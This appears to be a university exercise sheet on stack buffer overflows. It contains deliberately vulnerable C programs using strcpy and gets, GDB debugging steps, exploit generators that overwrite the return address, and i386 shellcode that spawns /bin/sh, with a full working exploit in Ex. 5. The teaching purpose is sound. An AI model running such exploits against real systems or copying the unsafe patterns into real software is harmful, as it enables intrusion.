  .-------------------------------.
  |  PROACTIVE COMPUTER SECURITY  |
  |    Week 4: Stack overflows    |
  |      Exercises                |
  '-------------------------------'

= Ex. 1

Write off the following program:

,----[ ex1.c ]
| #include <stdlib.h>
| #include <string.h>
| #include <stdio.h>
|
| void exploit_me(char *arg) {
|   int is_admin;
|   char buf[32];
|
|   is_admin = 0;
|   strcpy(buf, arg);
|
|   if (is_admin) {
|     printf("Good day, master\n");
|   }
|
| }
|
| int main (int argc, char *argv[]) {
|   exploit_me(argv[1]);
|   return EXIT_SUCCESS;
| }
`----

Compile it with GCC:

  $ gcc -m32 ex1.c -o ex1

Now try to get the program to print "Good day, master".

Questions:
 - What do you think the stack frame of `main` looks like?  Draw your guess.  Be
   as precise as you can be -- try different inputs to get as much information
   as you can.
 - Disassemble the program.  Was your guess correct?
 - Try overflowing the return address.  Run the program with GDB attached to see
   what happens (remember the --args flag).

= Ex. 2

Write off and compile these two programs:

,----[ ex2a.c ]
| #include <stdlib.h>
| #include <string.h>
| #include <stdio.h>
|
| void exploit_me(char *arg) {
|   struct {
|     int is_admin;
|     char buf[32];
|   } v;
|
|   v.is_admin = 0;
|   strcpy(v.buf, arg);
|
|   if (v.is_admin) {
|     printf("Good day, master\n");
|   }
| }
|
| int main (int argc, char *argv[]) {
|   exploit_me(argv[1]);
|   return EXIT_SUCCESS;
| }
`----

,----[ ex2b.c ]
| #include <stdlib.h>
| #include <string.h>
| #include <stdio.h>
|
| void exploit_me(char *arg) {
|   struct {
|     char buf[32];
|     int is_admin;
|   } v;
|
|   v.is_admin = 0;
|   strcpy(v.buf, arg);
|
|   if (v.is_admin) {
|     printf("Good day, master\n");
|   }
| }
|
| int main (int argc, char *argv[]) {
|   exploit_me(argv[1]);
|   return EXIT_SUCCESS;
| }
`----

Try to get each of the to print "Good day, master".  Can you do it?

Questions:
 - What is the difference between the two programs?
 - What or who decides the layout of stack variables?

= Ex. 3

Write off and compile this variation of `ex1.c`:

,----[ ex3.c ]
| #include <stdlib.h>
| #include <stdio.h>
|
| void exploit_me(void) {
|   int is_admin;
|   char buf[32];
|
|   is_admin = 0;
|   gets(buf);
|
|   if (is_admin) {
|     printf("Good day, master\n");
|   }
| }
|
| int main (int argc, char *argv[]) {
|   exploit_me();
|   return EXIT_SUCCESS;
| }
`----

Again, as before, get the program to output "Good day, master".  Write the input
you used to a file called `input`.  Now run the program like this:

  $ ./ex3 < input

Make sure that it still prints "Good day, master".  Now try running the program
with GDB attached.  But how do we tell GDB to send a program a text on STDIN?

First load `ex3` into GDB:

  $ gdb ex3

Now you can use either:

  (gdb) set args < input
  (gdb) run

or

  (gdb) run < input

The `run` command can also take command line arguments:

  (gdb) run arg1 arg2 ... < input-file

Use the `help` command to read about `run` and `set args`.

Questions:
  - Can you think of another way to accomplish the same thing?  Maybe you
    remember something about STDIN/STDOUT being annoying from week 3's
    exercises?
  - Can you run your "exploit" without putting the payload into a file?  Try
    searching for "bash here strings" on the Internet.

= Ex. 4

Usually you will write a program to generate an exploit payload and run the
exploit.

Lets write an "exploit" for `ex1` in C.  Write off this program:

,----[ ex1-exploit.c ]
| #include <unistd.h>
| #include <stdlib.h>
| #include <stdint.h>
| #include <string.h>
|
| struct {
|   char buf[32];
|   int is_admin;
|   char padding[8];
|   uint32_t saved_ebp;
|   uint32_t return_addr;
|   char null;
| } payload;
|
| int main (int argc, char *argv[]) {
|   // Fill payload with A's
|   memset(&payload, 'A', sizeof(payload));
|   // Null terminate the string
|   payload.null = 0;
|
|   payload.saved_ebp = 0x42424242;
|   payload.return_addr = 0x41414141;
|
|   char *const exec_argv[] = {
|     "./ex1",
|     (char*)&payload,
|     NULL
|   };
|
|   execv(exec_argv[0], exec_argv);
|
|   return EXIT_SUCCESS;
| }
`----

Take a moment to read through it and understand the details.  Make sure that it
works -- your stack may not be exactly as mine.

The program should fail with a segmentation fault because EIP is being set to
0x41414141.  But can you be sure?  Time to bring out GDB:

  $ gdb ex1-exploit
  (gdb) run
  ...
  Good day, master

  Program received signal SIGSEGV, Segmentation fault.
  0x41414141 in ?? ()

But it all went very fast, didn't it.  What if we want to step through the
target program with GDB?  We can tell GDB that `ex1-exploit` is a program which
is used to execute the actual target.  GDB calls it an "exec-wrapper".

First load the target program (not the exploit) into GDB:

  $ gdb ex1

Then set the exec-wrapper program:

  (gdb) set exec-wrapper ./ex1-exploit

Note the "./" -- it is important.  Finally set a breakpoint at `main` and run
the exploit (or use the `start` command):

  (gdb) b main
  (gdb) run

GDB should stop at the start of `main` in `ex1` after running `ex1-exploit`.
Confirm by stepping through the program.

Questions:
  - Why do we need the exploit to be a wrapper in the first place?  Do we indeed
    need it to be?  Try to find another way to 1) generate the payload, 2) run
    the target program and 3) debug the target program.
  - You may have been wondering why `ex{1,2{a,b},3}.c` have an `exploit_me`
    function and don't just have all the code in `main`.  Try rewriting `ex1.c`
    to only have a `main` function.  Then try to control EIP.  Can you do it?
    Why or why not?

= Ex. 5

In this exercise we will create a fully working exploit.

Start by writing off and compiling this vulnerable program:

,----[ ex5.c ]
| #include <stdlib.h>
| #include <string.h>
|
| char bss_buf[4096];
|
| void exploit_me(char *x, char *y) {
|   char stk_buf[32];
|
|   strcpy(bss_buf, x);
|   strcpy(stk_buf, y);
| }
|
| int main (int argc, char *argv[]) {
|   exploit_me(argv[1], argv[2]);
|   return EXIT_SUCCESS;
| }
`----

The buffer `bss_buf` will be placed on a known location, so we will store our
shellcode there.  On the i386 architecture memory that is readable is also
implicitly executable.  But that is not the case on amd64, even when running 32
bit code.  Therefore you must mark the BSS section as executable if you are
using an amd64 system.  We use the tool `execstack` to do that:

  $ execstack -s ex5

Don't be fooled by the word "stack"; the Linux kernel will use the
read-implies-exec semantics when the `GNU_STACK` program header has the exec-bit
set.  Use the source, Luke:
- https://github.com/torvalds/linux/blob/0e034f5c4bc408c943f9c4a06244415d75d7108c/fs/binfmt_elf.c#L783
- https://github.com/torvalds/linux/blob/0e034f5c4bc408c943f9c4a06244415d75d7108c/fs/binfmt_elf.c#L848
- https://github.com/torvalds/linux/blob/9a45f036af363aec1efec08827c825d69c115a9a/arch/x86/include/asm/elf.h#L271

Write off this shell-poppin' shellcode:

,----[ shellcode.asm ]
| bits 32
|     ;; push '/bin///sh\x00'
|     push 0x68
|     push 0x732f2f2f
|     push 0x6e69622f
|
|     ;; call execve('esp', 0, 0)
|     mov ebx, esp
|     xor ecx, ecx
|     push 0xb
|     pop eax
|     cdq ;; Set edx to 0, eax is known to be positive
|     int 0x80
`----

And assemble it:

  $ nasm shellcode.asm

Reverse engineer `ex5` or use `readelf` to find the address of `bss_buf`.  On my
system the address is at 0x08049740.

Finally write off this exploit (and remember to put in the correct address):

,----[ ex5-exploit.c ]
| #include <unistd.h>
| #include <stdlib.h>
| #include <stdint.h>
| #include <string.h>
| #include <fcntl.h>
|
| struct {
|   char buf[32];
|   char padding[8];
|   uint32_t saved_ebp;
|   uint32_t return_addr;
|   char null;
| } overflow;
|
| unsigned char shellcode[4096];
|
| int main (int argc, char *argv[]) {
|   int fd;
|   memset(&overflow, 'A', sizeof(overflow));
|   overflow.null = 0;
|
|   overflow.saved_ebp = 0x42424242;
|   overflow.return_addr = 0x08049740;
|
|   memset(shellcode, 0, sizeof(shellcode));
|   fd = open("shellcode", O_RDONLY);
|   read(fd, shellcode, sizeof(shellcode));
|   close(fd);
|
|   char *const exec_argv[] = {
|     "./ex5",
|     (char*)shellcode,
|     (char*)&overflow,
|     NULL
|   };
|
|   execv(exec_argv[0], exec_argv);
|
|   return EXIT_SUCCESS;
| }
`----

Questions:
 - Does it even work?  Don't take my word for it, try it and -- if necessary --
   fix it.
 - What happens if your forget to run `execstack`.  Use what you have learned to
   run your exploit in GDB (hint: break on `bss_buf`).
 - Run `strip -s ex5` and repeat the exercise.  Is it harder now?

= Ex. 6

We have included 5 programs for you to exploit.  The goal is to get arbitrary
code execution or a shell.

Suggested order: level1, level2, level3, hello, level4.

Good luck!
